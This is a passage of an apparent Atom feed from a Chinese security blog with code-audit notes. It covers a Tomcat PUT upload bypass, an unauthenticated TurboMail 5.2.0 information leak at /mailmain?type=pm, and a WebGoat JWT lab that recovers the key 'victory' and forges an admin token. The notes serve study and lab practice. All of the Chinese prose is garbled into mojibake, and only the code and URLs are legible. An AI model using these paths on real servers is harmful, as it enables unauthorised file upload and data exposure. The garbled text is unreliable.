<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>fileBase<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ‰§è¡Œåˆ° <code>File file = new File(this.fileBase, name); </code>æ—¶ï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ª File å¯¹è±¡ï¼ŒfileBase æ˜¯ Web åº”ç”¨æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ã€‚</p><p>è¿™é‡Œçš„ name å°±æ˜¯ä¼ å…¥çš„æ–‡ä»¶åï¼Œæ¯”å¦‚ /teamssix.jsp/ï¼Œåœ¨ File å®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­ä¼šå¤„ç†æ‰ /ï¼Œå› æ­¤ /teamssix.jsp/ ä¼šå˜æˆ  /teamssix.jsp</p><p>æ‰€ä»¥é€šè¿‡ PUT è¯·æ±‚ï¼Œåˆ©ç”¨ /teamssix.jsp/ å¯ä»¥è¾¾åˆ°ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#0x00-ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;0x00 ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ç›´æ¥ Docker æ­å»ºå³å¯&lt;/p&gt;
&lt;pre class=&quot;line-number</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘æ•æ„Ÿä¿¡æ¯æ³„éœ²</title>
    <link href="https://www.teamssix.com/211215-131111.html"/>
    <id>https://www.teamssix.com/211215-131111.html</id>
    <published>2021-12-15T05:11:11.000Z</published>
    <updated>2021-12-15T05:57:22.590Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œä»¥ TurboMail 5.2.0 é‡Œçš„æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ä½œä¸ºå­¦ä¹ ã€‚</p><p>å·²çŸ¥ TurboMail 5.2.0 çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²è·¯å¾„ä¸º /mailmain?type=pm</p><p>æ‰“å¼€ TurboMail çš„å®‰è£…ç›®å½•ï¼Œåœ¨ turbomail\web\webapps\ROOT\WEB-INF ä¸‹æ‰¾åˆ° web.xml æ–‡ä»¶ï¼Œå‘ç°ä»¥ä¸‹é…ç½®ä¿¡æ¯</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/mailmain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>turbomail.web.MailMain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»è¿™äº›é…ç½®ä¿¡æ¯ä¸éš¾çœ‹å‡º /mailmain è·¯å¾„å¯¹åº”çš„ servlet-name æ˜¯ mailmainiï¼Œè€Œ mailmaini å¯¹åº”çš„ servlet-class æ˜¯ turbomail.web.MailMain</p><p>é‚£ä¹ˆè¿™é‡Œå°±éœ€è¦æ‰¾åˆ° turbomail.web.MailMain ç±»è¿›è¡Œåˆ†æï¼Œå‡è®¾è¿™ä¸ªç±»æ˜¯åœ¨ turbomail.jar æ–‡ä»¶é‡Œï¼Œé€šè¿‡æœç´¢åœ¨ /turbomail/web/webapps/ROOT/WEB-INF/lib/ ä¸‹æ‰¾åˆ° turbomail.jar æ–‡ä»¶</p><p>åˆ©ç”¨ jd-gui æˆ–è€… Intellij IDEA å¯¹ turbomail.jar è¿›è¡Œåç¼–è¯‘ï¼Œå¯ä»¥åœ¨ turbomail/web/ æ–‡ä»¶å¤¹å†…æ‰¾åˆ° MailMain.java æ–‡ä»¶ï¼Œè¿™è¯´æ˜ä¹‹å‰çš„å‡è®¾æ˜¯æ­£ç¡®çš„ã€‚</p><p>åœ¨ 195 è¡Œå¯ä»¥çœ‹åˆ°æ¥æ”¶äº† type å‚æ•°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">195</span>  <span class="token class-name">String</span> type <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">196</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">197</span>      type <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token number">198</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ 543 è¡Œå¯ä»¥çœ‹åˆ°å¦‚æœ type å‚æ•°ä¸º pmï¼Œåˆ™æ‰§è¡Œ PMAdmin çš„ show æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">543</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"pm"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">544</span>     <span class="token class-name">PMAdmin</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŸ¥çœ‹è¯¥æ–¹æ³•çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> bAjax<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PMInterface</span> pm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> alPM<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PMInterface</span><span class="token punctuation">)</span>alPM<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pm<span class="token punctuation">.</span><span class="token function">PM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">String</span> str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">SysConts<span class="token punctuation">.</span>New_InCharSet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› æ­¤ç›´æ¥è®¿é—® /mailmain?type=pm å°±å¯ä»¥çœ‹åˆ°å·²ç™»å½•çš„ç”¨æˆ·é‚®ç®±ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png"></p><p>è¿™ä¸ªåœ°æ–¹é™¤äº†æ³„éœ²ç™»å½•ç”¨æˆ·é‚®ç®±å¤–ï¼Œtype åé¢è·Ÿä¸Šä¸åŒçš„å‚æ•°è¿˜ä¼šæ³„éœ²é‚®ç®±ç”¨æˆ·åˆ—è¡¨ä»¥åŠå¯¹ç®¡ç†å‘˜å¯†ç é‡ç½®ç­‰ï¼Œè¯»è€…å¯ä»¥è‡ªå·±å°è¯•å»å‘ç°å‘ç°ã€‚</p><blockquote><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é‡Œä»¥ TurboMail 5.2.0 é‡Œçš„æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ä½œä¸ºå­¦ä¹ ã€‚&lt;/p&gt;
&lt;p&gt;å·²çŸ¥ TurboMail 5.2.0 çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²è·¯å¾„ä¸º /mailmain?type=pm&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ TurboMail çš„å®‰è£…ç›®å½•ï¼Œåœ¨ turbomail\web\weba</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘JWT Token</title>
    <link href="https://www.teamssix.com/211214-175948.html"/>
    <id>https://www.teamssix.com/211214-175948.html</id>
    <published>2021-12-14T09:59:48.000Z</published>
    <updated>2021-12-14T11:07:43.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»"><a href="#0x00-ä»‹ç»" class="headerlink" title="0x00 ä»‹ç»"></a>0x00 ä»‹ç»</h1><p>JSON Web Token ç¼©å†™æˆ JWTï¼Œè¢«ç”¨äºå’ŒæœåŠ¡å™¨çš„è®¤è¯åœºæ™¯ä¸­ï¼Œè¿™ä¸€ç‚¹æœ‰ç‚¹ç±»ä¼¼äº Cookie é‡Œçš„ Session idï¼Œå…³äºè¿™ä¸¤è€…çš„åŒºåˆ«å¯ä»¥çœ‹æœ¬æ–‡å°¾éƒ¨çš„å‚è€ƒé“¾æ¥ã€‚</p><p>JWT ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼Œåˆ†åˆ«ä¸º Headerï¼ˆå¤´éƒ¨ï¼‰ã€Payloadï¼ˆè´Ÿè½½ï¼‰ã€Signatureï¼ˆç­¾åï¼‰ï¼Œä¸‰è€…ä»¥å°æ•°ç‚¹åˆ†å‰²ï¼Œæ ¼å¼ç±»ä¼¼äºè¿™æ ·ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">Header.Payload.Signature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®é™…é‡åˆ°çš„ JWT ä¸€èˆ¬æ˜¯è¿™ç§æ ·å­</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>JWT çš„ç¬¬ä¸€éƒ¨åˆ† Header é€šå¸¸ç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼š</strong></p><ul><li>alg è¡¨ç¤ºä½¿ç”¨çš„ç­¾åç®—æ³•ï¼Œä¾‹å¦‚ RSAã€HMAC SHA256ï¼ˆæˆ–ç®€å†™ä¸º HS256ï¼‰</li><li>typ è¡¨ç¤º Token çš„ç±»å‹ Type</li></ul><p>é€šå¸¸å†™æˆä»¥ä¸‹ JSON æ ¼å¼ çš„æ ·å­</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä½¿ç”¨ Base64URL ç¼–ç ä¸º eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9ï¼Œå°±å½¢æˆäº† JWT çš„ç¬¬ä¸€éƒ¨åˆ†ã€‚</p><p><strong>JWT çš„ç¬¬äºŒéƒ¨åˆ† Payload  ä¹Ÿæ˜¯ JSON çš„æ ¼å¼ï¼Œä¾‹å¦‚ï¼š</strong></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°†è¯¥ JSON å¯¹è±¡è¿›è¡Œ Base64URL ç¼–ç ä¸º eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQï¼Œå°±å½¢æˆäº† JWT çš„ç¬¬äºŒéƒ¨åˆ†ã€‚</p><p>å¯¹äº Payload å®˜æ–¹è§„å®šäº† 7 ä¸ªå­—æ®µï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">iss (issuer)ï¼šç­¾å‘äººexp (expiration time)ï¼šè¿‡æœŸæ—¶é—´sub (subject)ï¼šä¸»é¢˜aud (audience)ï¼šå—ä¼—nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´iat (Issued At)ï¼šç­¾å‘æ—¶é—´jti (JWT ID)ï¼šç¼–å·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿæ˜¯å¯ä»¥å®šä¹‰ç§æœ‰å­—æ®µçš„ã€‚</p><p><strong>JWT çš„ç¬¬ä¸‰éƒ¨åˆ† Signature æ˜¯å¯¹ Header å’Œ Payload éƒ¨åˆ†çš„ç­¾åï¼Œèµ·åˆ°é˜²æ­¢æ•°æ®ç¯¡æ”¹çš„ä½œç”¨ã€‚</strong></p><p>é¦–å…ˆéœ€è¦æŒ‡å®šä¸€ä¸ªå¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥åªæœ‰æœåŠ¡å™¨çŸ¥é“ï¼Œç„¶ååˆ©ç”¨ Header é‡ŒæŒ‡å®šçš„åŠ å¯†ç®—æ³•ï¼ˆé»˜è®¤æ˜¯ HMAC SHA256ï¼‰æŒ‰ç…§ä¸‹é¢çš„å…¬å¼ç”Ÿæˆç­¾åã€‚</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x01-é¶åœºå¤ç°"><a href="#0x01-é¶åœºå¤ç°" class="headerlink" title="0x01 é¶åœºå¤ç°"></a>0x01 é¶åœºå¤ç°</h1><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>è¿™é‡Œä½¿ç”¨ WebGoat é¶åœºè¿›è¡Œ JWT Token å®éªŒï¼Œç›´æ¥ Docker æ­å»ºå³å¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker pull webgoat/goatandwolf<span class="token function">sudo</span> docker run -p <span class="token number">8080</span>:8080 -p <span class="token number">9090</span>:9090 -e <span class="token assign-left variable">TZ</span><span class="token operator">=</span>Europe/Amsterdam -d webgoat/goatandwolf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰“å¼€ä¹‹åï¼Œæ¥åˆ° (A2) Broken Authentication æ‰¾åˆ° JWT Token çš„ç¬¬ 5 å…³ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€å…³æ˜¯éœ€è¦ä¿®æ”¹ JWT Token çš„å€¼ä»¥ admin èº«ä»½è¿›è¡ŒæŠ•ç¥¨é‡ç½®ï¼Œé‚£ä¹ˆéœ€è¦å…ˆæ‰¾åˆ° JWT çš„åŠ å¯†å¯†é’¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112141758858.png"></p><p>åœ¨ç‚¹å‡»é‡ç½®æŠ•ç¥¨æŒ‰é’®æ—¶ï¼Œè¯·æ±‚çš„ URL ä¸º <a href="http://172.16.214.20:8080/WebGoat/JWT/votings">http://172.16.214.20:8080/WebGoat/JWT/votings</a></p><p>Clone æºç åˆ°æœ¬åœ°ï¼Œçœ‹çœ‹åœ¨æºç é‡Œèƒ½å¦æ‰¾åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/WebGoat/WebGoat.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥åœ¨ä»£ç é‡Œå…¨å±€æœç´¢ /JWT/votings</p><p>åœ¨ webgoat-lessons/jwt/src/main/java/org/owasp/webgoat/jwt/JWTVotesEndpoint.java çš„ç¬¬ 163 è¡Œæ‰¾åˆ° @PostMapping(â€œ/JWT/votingsâ€)ï¼Œé€šè¿‡å‡½æ•°å resetVotes() åˆ¤æ–­å¤§æ¦‚ç‡æ˜¯è¿›è¡Œé‡ç½®æŠ•ç¥¨çš„å‡½æ•°ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/JWT/votings"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">AttackResult</span> <span class="token function">resetVotes</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"access_token"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> accessToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Jwt</span> jwt <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span>JWT_PASSWORD<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Claims</span> claims <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Claims</span><span class="token punctuation">)</span> jwt<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> isAdmin <span class="token operator">=</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> claims<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isAdmin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-only-admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                votes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>vote <span class="token operator">-></span> vote<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JwtException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡åˆ†æä»£ç ï¼Œä»ä¸Šé¢ä»£ç çš„ç¬¬ 8 è¡Œä¸­ä¸éš¾çœ‹å‡º JWT çš„å¯†ç ä¸º JWT_PASSWORD å˜é‡ï¼Œå½“ Cookie ä¸­çš„ access_token å‚æ•°é‡Œçš„ Payload éƒ¨åˆ†ï¼ˆå³ä¸Šé¢ä»£ç é‡Œçš„ç¬¬ 10 è¡Œ claims.getï¼‰çš„ admin å‚æ•°å€¼ä¸º true æ—¶åˆ™åˆ¤æ–­ä¸º admin ç”¨æˆ·ï¼Œå¦‚æœä¸º false åˆ™è¿”å› jwt-only-admin</p><p>é€šè¿‡åœ¨ä»£ç é‡ŒæŸ¥è¯¢ JWT_PASSWORD å˜é‡ï¼Œå¯ä»¥æ‰¾åˆ°å€¼ä¸º victory</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JWTVotesEndpoint</span> <span class="token keyword">extends</span> <span class="token class-name">AssignmentEndpoint</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> JWT_PASSWORD <span class="token operator">=</span> <span class="token class-name">TextCodec</span><span class="token punctuation">.</span>BASE64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"victory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> validUsers <span class="token operator">=</span> <span class="token string">"TomJerrySylvester"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>çŸ¥é“äº† jwt å¯†é’¥ä¹‹åï¼Œåœ¨ <a href="https://jwt.io/">jwt.io</a> ä¸Šå°† Payload éƒ¨åˆ†çš„ admin å€¼ä¿®æ”¹ä¸º true ï¼Œåœ¨ Signature éƒ¨åˆ†æ·»åŠ å¯†é’¥é‡æ–°ç”Ÿæˆ JWTï¼Œç„¶å Burp æ›¿æ¢å°±å¯ä»¥æˆåŠŸé‡ç½®æŠ•ç¥¨äº†ã€‚</p><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>é™¤äº†ä»¥ä¸Šé€šè¿‡æºç æ‰¾ JWT å¯†é’¥çš„æ–¹æ³•è¿˜å¯ä»¥åˆ©ç”¨å°†åŠ å¯†ç®—æ³•ä¿®æ”¹ä¸º noneï¼Œå³é€šè¿‡ä¸åŠ 